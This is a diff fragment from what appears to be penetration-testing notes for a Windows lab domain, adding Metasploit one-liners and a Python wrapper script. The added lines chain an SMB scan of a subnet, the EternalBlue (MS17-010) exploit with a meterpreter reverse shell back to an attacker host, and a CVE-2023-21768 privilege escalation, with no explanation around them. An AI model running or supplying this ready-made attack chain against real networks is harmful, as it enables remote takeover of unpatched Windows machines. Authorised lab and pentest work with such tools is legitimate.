@@ -71,4 +71,28 @@ CVE-2023-38146: This arbitrary code execution vulnerability involves Windows 11 
 export KRB5CCNAME=/workspace/khal.drogo.ccache 
 smbclient.py -k @braavos.essos.local
 
+----
+msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 10.2.10.11,10.2.10.21; run; use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.2.10.11,10.2.10.21; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.2.99.1; run; sessions -i -1 -C 'use exploit/windows/local/cve_2023_21768_afd_lpe; run'; exit"
 
+msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 10.2.10.0/24; run; use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.2.10.0/24; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.2.99.1; run; sessions -i -1 -C 'use exploit/windows/local/cve_2023_21768_afd_lpe; run'; exit" 
+--
+import os
+
+msf_commands = """
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 10.2.10.0/24
+run
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.2.10.0/24
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <your_ip>
+run
+sessions -i -1 -C "use exploit/windows/local/cve_2023_21768_afd_lpe; run"
+exit
+"""
+
+with open("msf_script.rc", "w") as f:
+    f.write(msf_commands)
+
+os.system("msfconsole -q -r msf_script.rc")
+--
